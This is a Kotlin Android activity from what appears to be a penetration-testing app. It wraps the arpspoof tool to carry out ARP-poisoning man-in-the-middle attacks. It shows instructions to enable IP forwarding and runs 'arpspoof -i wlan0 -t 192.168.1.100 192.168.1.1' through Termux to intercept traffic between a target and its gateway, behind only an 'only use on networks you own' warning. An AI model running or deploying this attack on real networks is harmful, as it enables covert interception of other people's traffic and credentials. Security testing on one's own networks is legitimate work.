package com.android.pen15.ui.network

import android.os.Bundle
import androidx.lifecycle.lifecycleScope
import com.android.pen15.R
import com.android.pen15.ui.base.BaseToolActivity
import com.android.pen15.utils.ToolChecker
import kotlinx.coroutines.launch

class ARPPoisonerActivity : BaseToolActivity() {

    private var toolAvailable = false

    override fun getToolName() = "ARP Poisoner"
    override fun getLayoutResource() = R.layout.activity_generic_tool
    override fun onToolExecute() { startAttack() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        logMessage("ARP Poisoning (MITM)", includeTimestamp = false)
        logMessage("⚠️ ONLY USE ON NETWORKS YOU OWN!", includeTimestamp = false)
        logMessage("")
        logMessage("Intercepts traffic between router and target", includeTimestamp = false)
        logMessage("")

        // Check tool availability
        lifecycleScope.launch {
            toolAvailable = ToolChecker.checkToolAvailable(this@ARPPoisonerActivity, "arpspoof")
            if (!toolAvailable) {
                logMessage("⚠️ arpspoof not installed!", includeTimestamp = false)
                logMessage("", includeTimestamp = false)
                logMessage("Install with:", includeTimestamp = false)
                logMessage("${ToolChecker.getInstallCommand("arpspoof")}", includeTimestamp = false)
                executeButton.isEnabled = false
            } else {
                logMessage("✓ arpspoof is available", includeTimestamp = false)
                logMessage("")
                logMessage("Default target: 192.168.1.100", includeTimestamp = false)
                logMessage("Default gateway: 192.168.1.1", includeTimestamp = false)
                logMessage("")
                logMessage("⚠️ Requires IP forwarding enabled!", includeTimestamp = false)
                logMessage("Run: echo 1 > /proc/sys/net/ipv4/ip_forward", includeTimestamp = false)
            }
        }
    }

    private fun startAttack() {
        if (!toolAvailable) {
            logMessage("ERROR: arpspoof not available")
            return
        }

        clearOutput()
        logMessage("⚠️ Starting ARP poisoning attack...")
        logMessage("")
        logMessage("Target: 192.168.1.100")
        logMessage("Gateway: 192.168.1.1")
        logMessage("Interface: wlan0")
        logMessage("")
        logMessage("This will intercept traffic between target and gateway")
        logMessage("Press Ctrl+C to stop the attack")
        logMessage("")

        executeCommandWithProgress("arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1", useTermux = true)

        logMessage("")
        logMessage("Attack stopped")
    }
}
